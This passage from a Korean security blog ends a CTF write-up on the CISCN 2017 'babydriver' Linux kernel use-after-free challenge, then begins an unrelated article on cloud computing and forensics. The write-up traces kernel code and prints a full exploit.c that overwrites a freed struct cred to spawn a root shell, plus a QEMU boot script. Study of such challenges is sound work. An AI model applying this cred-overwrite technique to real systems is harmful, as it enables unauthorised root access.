class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">p</span>;</span></span><br><span class="line">	<span class="type">int</span> trace = <span class="number">0</span>;</span><br><span class="line">	<span class="type">long</span> nr;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Determine whether and which event to report to ptracer.  When</span></span><br><span class="line"><span class="comment">	 * called from kernel_thread or CLONE_UNTRACED is explicitly</span></span><br><span class="line"><span class="comment">	 * requested, no event is reported; otherwise, report if the event</span></span><br><span class="line"><span class="comment">	 * for the type of forking is enabled.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (!(clone_flags &amp; CLONE_UNTRACED)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (clone_flags &amp; CLONE_VFORK)</span><br><span class="line">			trace = PTRACE_EVENT_VFORK;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ((clone_flags &amp; CSIGNAL) != SIGCHLD)</span><br><span class="line">			trace = PTRACE_EVENT_CLONE;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			trace = PTRACE_EVENT_FORK;</span><br><span class="line">		<span class="keyword">if</span> (likely(!ptrace_event_enabled(current, trace)))</span><br><span class="line">			trace = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	p = copy_process(clone_flags, stack_start, stack_size,</span><br><span class="line">			 child_tidptr, <span class="literal">NULL</span>, trace, tls, NUMA_NO_NODE);</span><br><span class="line">	add_latent_entropy();</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(p))</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(p);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>이는 <code>do_fork()</code> 함수이다. 이 함수에서는 <code>copy_process()</code> 함수를 호출한다.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PROVE_LOCKING</span></span><br><span class="line">	DEBUG_LOCKS_WARN_ON(!p-&gt;hardirqs_enabled);</span><br><span class="line">	DEBUG_LOCKS_WARN_ON(!p-&gt;softirqs_enabled);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	retval = -EAGAIN;</span><br><span class="line">	<span class="keyword">if</span> (<span class="type">atomic_read</span>(&amp;p-&gt;real_cred-&gt;user-&gt;processes) &gt;=</span><br><span class="line">			task_rlimit(p, RLIMIT_NPROC)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (p-&gt;real_cred-&gt;user != INIT_USER &amp;&amp;</span><br><span class="line">		    !capable(CAP_SYS_RESOURCE) &amp;&amp; !capable(CAP_SYS_ADMIN))</span><br><span class="line">			<span class="keyword">goto</span> bad_fork_free;</span><br><span class="line">	&#125;</span><br><span class="line">	current-&gt;flags &amp;= ~PF_NPROC_EXCEEDED;</span><br><span class="line">	retval = copy_creds(p, clone_flags);</span><br><span class="line">	<span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> bad_fork_free;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If multiple threads are within copy_process(), then this check</span></span><br><span class="line"><span class="comment">	 * triggers too late. This doesn&#x27;t hurt, the check is only there</span></span><br><span class="line"><span class="comment">	 * to stop root fork bombs.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	retval = -EAGAIN;</span><br><span class="line">	<span class="keyword">if</span> (nr_threads &gt;= max_threads)</span><br><span class="line">		<span class="keyword">goto</span> bad_fork_cleanup_count;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><code>copy_process()</code> 함수이다.</p>
<p><code>task_struct</code>를 인자로 <code>copy_creds()</code> 함수를 호출한다.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">copy_creds</span><span class="params">(<span class="keyword">struct</span> task_struct *p, <span class="type">unsigned</span> <span class="type">long</span> clone_flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line">	<span class="keyword">if</span> (</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">		!p-&gt;cred-&gt;thread_keyring &amp;&amp;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">		clone_flags &amp; CLONE_THREAD</span><br><span class="line">	    ) &#123;</span><br><span class="line">		p-&gt;real_cred = get_cred(p-&gt;cred);</span><br><span class="line">		get_cred(p-&gt;cred);</span><br><span class="line">		alter_cred_subscribers(p-&gt;cred, <span class="number">2</span>);</span><br><span class="line">		kdebug(<span class="string">&quot;share_creds(%p&#123;%d,%d&#125;)&quot;</span>,</span><br><span class="line">		       p-&gt;cred, <span class="type">atomic_read</span>(&amp;p-&gt;cred-&gt;usage),</span><br><span class="line">		       read_cred_subscribers(p-&gt;cred));</span><br><span class="line">		<span class="type">atomic_inc</span>(&amp;p-&gt;cred-&gt;user-&gt;processes);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	new = prepare_creds();</span><br><span class="line">	<span class="keyword">if</span> (!new)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	<span class="keyword">if</span> (clone_flags &amp; CLONE_NEWUSER) &#123;</span><br><span class="line">		ret = create_user_ns(new);</span><br><span class="line">		<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">goto</span> error_put;</span><br><span class="line">	&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><code>copy_creds()</code> 함수이다.</p>
<p>이 함수 내부에서는 <code>prepare_creds()</code> 함수를 호출한다.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> cred *<span class="title function_">prepare_creds</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> =</span> current;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line">	validate_process_creds();</span><br><span class="line">	new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!new)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	kdebug(<span class="string">&quot;prepare_creds() alloc %p&quot;</span>, new);</span><br><span class="line">	old = task-&gt;cred;</span><br><span class="line">	<span class="built_in">memcpy</span>(new, old, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> cred));</span><br><span class="line">	<span class="type">atomic_set</span>(&amp;new-&gt;usage, <span class="number">1</span>);</span><br><span class="line">	set_cred_subscribers(new, <span class="number">0</span>);</span><br><span class="line">	get_group_info(new-&gt;group_info);</span><br><span class="line">	get_uid(new-&gt;user);</span><br><span class="line">	get_user_ns(new-&gt;user_ns);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><code>prepare_creds()</code> 함수 내부에서는 <code>kmem_Cache_alloc()</code> 함수를 호출한다. 위에서부터 함수 내부로 계속해서 들어왔더니 아래의 순서대로 호출된다.</p>
<p><code>fork()</code> → <code>clone()</code> → <code>do_fork()</code> → <code>copy_process()</code> → <code>copy_creds()</code> → <code>prepare_creds()</code> → <code>kmem_cache_alloc()</code><br>&#96;<br><br></p>
<h3 id="4-3-6-Exploit"><a href="#4-3-6-Exploit" class="headerlink" title="4.3.6. Exploit"></a>4.3.6. Exploit</h3><p><code>fork()</code> 함수를 호출하면 기존 <code>cred</code>를 복사할 공간이 필요하다.</p>
<p><code>cred</code> 구조체의 크기는 168 바이트이다.</p>
<ol>
<li><code>open()</code> 함수를 2번 호출하여 힙을 할당</li>
<li><code>babyioctl()</code> 함수를 호출하여 168 바이트 만큼 재할당</li>
<li><code>close()</code> 함수를 호출하여 힙을 해제(<code>free</code>)</li>
<li><code>fork()</code> 함수 호출</li>
<li><code>write()</code> 함수를 호출하여 <code>struct cred</code> 값 변경</li>
</ol>
<p>3번까지 진행하면 전역변수의 값은 Dangling Pointer가 된다.</p>
<p>그 후 4번을 진행하면 해제 한 힙 영역에 <code>struct cred</code>가 할당되고, Dangling Pointer는 할당된 168 바이트 힙 영역을 가리키게 된다.</p>
<p>5번이 진행되면 <code>write()</code> 함수를 호출하여 <code>struct cred</code>를 0으로 수정 후 <code>system(”/bin/sh”)</code> 함수를 호출하면 root 권한의 쉘을 획득하게 된다.</p>
<br>

<h3 id="4-3-7-Exploit-code"><a href="#4-3-7-Exploit-code" class="headerlink" title="4.3.7. Exploit code"></a>4.3.7. Exploit code</h3><p><code>exploit.c</code>는 다음과 같다.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMAND 0x10001</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> f1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="type">int</span> f2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    ioctl(f1, COMMAND, <span class="number">168</span>);</span><br><span class="line">    close(f1);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> fake_cred[<span class="number">30</span>] = &#123; <span class="number">0</span>, &#125;;</span><br><span class="line"></span><br><span class="line">        write(f2, fake_cred, <span class="number">28</span>);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        wait(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(f2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>익스의 성공 여부를 확인하기 위해 <code>boot.sh</code> 파일을 아래와 같이 수정해주었다.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">gcc exploit.c -static -o rootfs/exploit</span><br><span class="line"></span><br><span class="line"><span class="built_in">pushd</span> rootfs</span><br><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.cpio</span><br><span class="line"><span class="built_in">popd</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27;</span> -enable-kvm -moni</span><br><span class="line">tor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep</span><br></pre></td></tr></table></figure>

<p><code>./boot.sh를</code> 실행한 뒤, <code>./exploit</code>을 실행하면 LPE가 성공한 것을 확인할 수 있다.</p>
<p><img src="/images/monthly_24_05_image7.png" alt="그림 7. [LPE를 통한 root 권한 획득]"></p>
<center><b>그림 7. [LPE를 통한 root 권한 획득]<br></center></b><br>

<p><br><br></p>
<h1 id="5-마무리하며"><a href="#5-마무리하며" class="headerlink" title="5. 마무리하며"></a>5. 마무리하며</h1><p>이번 CTF 문제를 해결하면서 커널에서 발생하는 Use-After-Free (UAF) 취약점의 심각성과 이를 악용하는 방법에 대해 이해할 수 있었다. 문제 해결 과정에서 메모리 할당 및 해제 관리가 얼마나 중요한지, 그리고 작은 부주의가 어떻게 심각한 보안 위협으로 이어질 수 있는지를 확인할 수 있었다.</p>
<p>앞으로 커널 보안에 대한 깊이 있는 이해를 위해 커널 구조와 메모리 관리, 동기화 메커니즘 등을 심도 있게 공부하며 리눅스 커널 소스 코드를 분석해보는 것도 좋은 방법이 될 수 있다. </p>
<p><br><br></p>
<h1 id="6-참고문헌"><a href="#6-참고문헌" class="headerlink" title="6. 참고문헌"></a>6. 참고문헌</h1><p>[1] [Heap Exploit] UAF(Use After Free) 기법 이론설명. (N.d.).<br><a target="_blank" rel="noopener" href="https://dokhakdubini.tistory.com/35">https://dokhakdubini.tistory.com/35</a></p>
<p>[2] Use After Free (UAF) 너 뭐임?. (N.d.).<br><a target="_blank" rel="noopener" href="https://seclab614.tistory.com/3">https://seclab614.tistory.com/3</a></p>
<p>[3] Kernel (6) - CISCN 2017 babydriver write-up (Linux kernel UAF). (N.d.).<br><a target="_blank" rel="noopener" href="https://sunrinjuntae.tistory.com/130">https://sunrinjuntae.tistory.com/130</a> </p>
<p>[4] 까망눈 연구소. (N.d.).<br><a target="_blank" rel="noopener" href="https://jeongzero.oopy.io/">https://jeongzero.oopy.io/</a></p>
<p>[5] [Linux] QEMU 가상머신에 OS 설치하기. (N.d.).<br><a target="_blank" rel="noopener" href="https://stackframe.tistory.com/28">https://stackframe.tistory.com/28</a> </p>
<p>[6] [CISCN CTF 2017] babydriver (kernel exploit, kUAF). (N.d.).<br><a target="_blank" rel="noopener" href="https://koharinn.tistory.com/561#google_vignette">https://koharinn.tistory.com/561#google_vignette</a> </p>
<p>[7] [Linux Kernel] CISCN 2017 babydriver. (N.d.).<br><a target="_blank" rel="noopener" href="https://applemasterz17.tistory.com/229">https://applemasterz17.tistory.com/229</a></p>
<p>[8] [CISCN CTF 2017] babydriver. (N.d.).<br><a target="_blank" rel="noopener" href="http://ipwn.kr/index.php/2020/04/05/ciscn-ctf-2017-babydriver/">http://ipwn.kr/index.php/2020/04/05/ciscn-ctf-2017-babydriver/</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://swu-swing.github.io/2024/04/30/monthly_24_04/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="SWING">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SW1NGL0G">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | SW1NGL0G">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/04/30/monthly_24_04/" class="post-title-link" itemprop="url">[4월호] 클라우드와 포렌식</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2024-04-30 18:00:00" itemprop="dateCreated datePublished" datetime="2024-04-30T18:00:00+09:00">2024-04-30</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2025-04-07 01:09:59" itemprop="dateModified" datetime="2025-04-07T01:09:59+09:00">2025-04-07</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Monthly/" itemprop="url" rel="index"><span itemprop="name">Monthly</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <!-- [4월호] 클라우드와 포렌식 -->

<h1 id="1-들어가며"><a href="#1-들어가며" class="headerlink" title="1. 들어가며"></a>1. 들어가며</h1><p>1990년대 중반 인터넷이 상용화된 이후 IT 분야는 비약적으로 발전하여, 이제는 어디에서나 수준 높은 IT 기술을 발견할 수 있는 시대가 되었다. 휴대폰, 노트북 등 누가 봐도 ‘컴퓨터’인 것들이 있는 반면, 우리가 자연스럽게 사용하면서도 그 속에 든 복잡한 기술은 잘 모르는 경우도 많다. 클라우드가 대표적인 예시이다.</p>
<p>클라우드는 많은 대중들이 익숙하게 사용하는 단어이다. 아이폰의 iCloud나 삼성 클라우드 서비스를 사용하는 사람을 찾는 것은 그다지 어렵지 않다. 두 서비스 모두 휴대폰에 저장되는 데이터를 클라우드에 백업 하거나, 부족한 휴대폰 용량을 대신하여 사용하거나, 기기간의 데이터 이동을 자유롭게 하기 위해 사용된다. 이런 식의 서비스를 제공하지만 조금 다른 이름을 가진 제품도 있다. 구글 드라이브, 네이버 MyBox, Microsoft OneDrive 등은 다양한 기기에서 파일을 공유할 수 있게끔 한다. 얼핏 다른 형태의 이름이 복잡하지만, 위에서 말한 모든 서비스는 ‘클라우드 스토리지 서비스’로 축약된다. 쉽게 말하자면 ‘소비자가 인터넷에 데이터를 저장할 수 있게끔 하는 서비스’다.</p>
<p>클라우드는 단순한 스토리지 서비스에만 사용되지 않는다. 소프트웨어 등 일반인들에게 직접적으로 느껴지지 않는 부분에서도 클라우드는 활발하게 사용되고 있다. 2023년 과기정통부에서 실시한 ‘2023년 기업체 지능정보기술 이용률’에 따르면 클라우드 컴퓨팅을 이용하는 회사는 69.5%에 달한다.</p>
<p>그럼 클라우드는 아무런 문제가 없는가? 기술적인 한계, 호환성의 문제, 복잡한 구성 등 클라우드 컴퓨팅의 문제에 대해서는 다양한 의견이 있겠지만 보안, 개중에서도 포렌식의 관점으로 클라우드를 뜯어보자. IT의 발전이 사이버범죄의 발전과 직결되는 시점에서 클라우드 컴퓨팅의 등장이 사이버범죄에 영향을 미친 것인 필연적이다. 기존 범죄 유형을 발전시킨 범죄 물론이고 클라우드 컴퓨팅만의 특징을 살린 범죄들도 존재한다. 예를 들어, “불법 파일이 구글 드라이브에 저장되어 있다면 포렌식 조사를 어떻게 진행해야 할까?” 이 글은 이 질문에서 시작되었다.</p>
<p>의문을 해결하기 위해, 클라우드 개념부터 유형별 분류, 그에 따른 예시. 그리고 클라우드 컴퓨팅과 함께 등장한 포렌식 시점에서의 논의에 대하여 알아볼 것이다. 이 글이 클라우드를 잘 모르는 사람들, 클라우드를 공부하고 싶은 사람들, 그리고 포렌식과 클라우드에 관심을 가지는 모든 사람들에게 도움이 되길 바란다.<br><br><br></p>
<h1 id="2-클라우드-컴퓨팅-Cloud-Computing"><a href="#2-클라우드-컴퓨팅-Cloud-Computing" class="headerlink" title="2. 클라우드 컴퓨팅 (Cloud Computing)"></a>2. 클라우드 컴퓨팅 (Cloud Computing)</h1><p>클라우드는 왜 등장했을까? 클라우드 이전에는 물리적인 컴퓨팅 자원만을 이용해 여러 서비스를 개발하고 사용해야만 했다. 이런 식으로 기업이 서버를 자체적으로 관리하는 방식을 On-premise(온프레미스)라 한다. 문제는, 물리적 컴퓨팅 자원에는 극복할 수 없는 비용적, 공간적 한계가 있다는 것이다. 예를 들어, 64GB 휴대폰의 저장 공간이 다 찬 경우를 생각해보자. 우린 SD 카드를 사거나 더 큰 용량의 휴대폰을 살 것이다. 하지만 모두가 추가적인 하드웨어를 살 수 있는 것은 아니다. 이런 문제점을 해결할 수 있는 것이 클라우드다.<br><br></p>
<h2 id="2-1-클라우드-기술의-발전"><a href="#2-1-클라우드-기술의-발전" class="headerlink" title="2.1. 클라우드 기술의 발전"></a>2.1. 클라우드 기술의 발전</h2><p>클라우드 컴퓨팅의 개념의 시초는 1960년대에 최초로 등장했다. 1965년 존 매카시(John McCarthy)의 “전화 시스템이 공공 유틸리티인 것처럼 컴퓨팅 또한 공공 유틸리티로 조직될 수 있다”는 말이 그 시작이다. 당시 클라우드는 AI의 존재만큼 뭉뚱그린 가설에 불가했지만 가상화 기술을 시작으로 다양한 컴퓨터 기술과 개념이 발전했고, 이들은 클라우드 컴퓨팅이라는 용어로 통합되어 진화해왔다.</p>
<p>클라우드의 개념이 본격적으로 적용된 것은 1990년대부터였다. Salesforce는 Salesforce.com 이라는 웹사이트를 통해 엔터프라이즈 응용프로그램을 제공하는 서비스형 소프트웨어(SaaS)모델을 사용했다. 흔히 말하는 클라우드 컴퓨팅, 즉 서비스형 인프라(IaaS)는 2006년 Amazon에서 개발한 Amazon Elastic Compute Could(EC2)로 시작되었다. 아마존 EC2는 사용자들이 컴퓨터에 액세스하여 클라우드에서 자신의 응용프로그램을 실행할 수 있게 해주었다. 이후 2008년 구글의 구글 앱 엔진(Google App Engine)에 의해 서비스형 플랫폼(PaaS) 개념이 대두되었고, 2009년 마이크로소프트의 Window Azure, 오픈소스 클라우드 컴퓨팅 플랫폼인 OpenStack 프로젝트 등 클라우드 컴퓨팅 서비스의 발전이 끊임없이 이어졌다. 지금도 그 발전은 가속화되고 있다.<br><br></p>
<h2 id="2-2-클라우드-컴퓨팅-개념"><a href="#2-2-클라우드-컴퓨팅-개념" class="headerlink" title="2.2. 클라우드 컴퓨팅 개념"></a>2.2. 클라우드 컴퓨팅 개념</h2><p>클라우드 컴퓨팅은 여러가지 기술이 통합하여 만들어졌기 때문에 한 문장으로 정의하는 것이 쉽지 않다. 미국 표준기술국 (NIST)에 따르면 클라우드 컴퓨팅은 누구나, 자신이 필요로 할 때, 네트워크를 통하여 쉽고 편리하게 사용할 수 있는 공유 컴퓨팅 리소스를 제공하는 모델이다. IBM은 애플리케이션부터 데이터 센터까지 모든 on demand 컴퓨팅 리소스를 인터넷을 통해 요금을 받고 제공하는 것으로 소개한다.</p>
<p>결론은 단순하다. 클라우드 컴퓨팅은 ‘<strong>언제</strong>’ ‘<strong>어디에서나</strong>’ ‘<strong>네트워크</strong>’를 통해 ‘<strong>IT 자원</strong>’을 사용하고 ‘<strong>대가</strong>’를 지불하는 것이다. 여기에서 IT 자원에는 서버, 저장소, 네트워킹, 소프트웨어 등 우리가 생각하는 대부분의 컴퓨팅 서비스가 포함된다.</p>
<p>단순히 네트워크를 통해 서비스를 제공한다고 모두 클라우드 컴퓨팅이 될 수 있는 것은 아니다. NIST는 클라우드 컴퓨팅이 가져야 하는 다섯가지의 필수 특징을 내놓았다. 먼저, 서비스 사용자는 서비스 제공자 간의 직접적인 상호작용 없이 원하는 클라우드 서비스를 이용할 수 있어야 한다(on-demand self-service). 또한, 서비스의 모든 기능은 인터넷을 통해 접근 가능해야 하며 (Broad network access), 클라우드 서비스 제공자의 컴퓨팅 자원은 멀티-테넌트(multi-tenant) 모델을 활용하여 다양한 사용자의 요구에 따라 동적으로 할당될 수 있어야 한다(Resource pooling). 이때 사용자는 자신이 제공받은 자원의 정확한 위치를 모르고, 이를 제어할 권한도 가지고 있지 않겠지만 국가, 주 또는 데이터센터 수준의 상위 레벨에서 대략적인 위치를 특정할 수는 있다. 이렇게 제공받은 컴퓨팅 자원의 가용량은 사용자 원할 때 빠르게 확장, 축소, 할당, 해제된다(Rapid Elasticity). 이는 소비자가 자원을 무제한으로 느끼게 만든다. 마지막으로, 이 모든 자원의 사용량은 모니터링되어야 하고, 클라우드 서비스 제공자와 사용자 모두에게 서비스에 대한 투명성을 제공하야 한다(Measured service).<br><br></p>
<h2 id="2-3-클라우드-컴퓨팅-유형"><a href="#2-3-클라우드-컴퓨팅-유형" class="headerlink" title="2.3. 클라우드 컴퓨팅 유형"></a>2.3. 클라우드 컴퓨팅 유형</h2><p>정의가 어려운 만큼 클라우드 컴퓨팅 서비스의 종류 또한 다양하다. 서론에서 언급했던 OneDrive 서비스도 클라우드 컴퓨팅이고 클라우드 기술 역사에서 언급된 AWS도 클라우드 컴퓨팅이지만 같은 서비스로 분류하기에는 무리가 있다. 이 둘의 차이는 ‘어떤 서비스를 제공하는가?’이다.</p>
<p>OneDrive는 개인용 스토리지 제품 중 하나로 SaaS(Software as a Service)로 분류된다. <em>SaaS는 서비스 제공자에 의해 소프트웨어가 이용자에게 공급되는 것을 의미한다.</em> 일반적으로 ‘애플리케이션을 사용’하는 것이 무엇이나 묻는다면 사람들은 컴퓨터에서는 소프트웨어를 다운받거나, 앱 스토어에서 필요한 앱을 다운받는 행위를 떠올릴 것이다. 하지만, 우리는 웹에 접속하기만 하여도 다양한 서비스를 사용할 수 있는 시대를 살고 있다. 알게 모르게 SaaS를 활발히 사용하고 있기 때문이다. SaaS에는 개인용 스토리지 서비스 뿐 아니라 웹을 통해 접근할 수 있는 모든 완전한 서비스가 포함된다. Email, 문서 관리 프로그램인 구글 Docs, 페이스북, 인스타그램 등 SNS 서비스까지 SaaS에 분류된다.</p>
<p><em>IaaS(Infrastructure as a Service)는 컴퓨팅 인프라를 제공하는 서비스이다.</em> 컴퓨팅 인프라는 서비스 제공자가 서비스를 제공하는데 필요한 자원이라 생각하면 편하다. 예를 들어, 웹 페이지를 서비스하기 위해서는 웹 서버, 데이터베이스 등이 필요하다. 과거에는 웹사이트 하나를 운영하기 위해서는 물리적인 웹 서버가 필요했다. 하지만 IaaS가 등장하여 물리적 서버 필요 없이 웹사이트를 운영할 수 있게 되었다. Amazon Ec2 서비스가 이에 해당된다.</p>
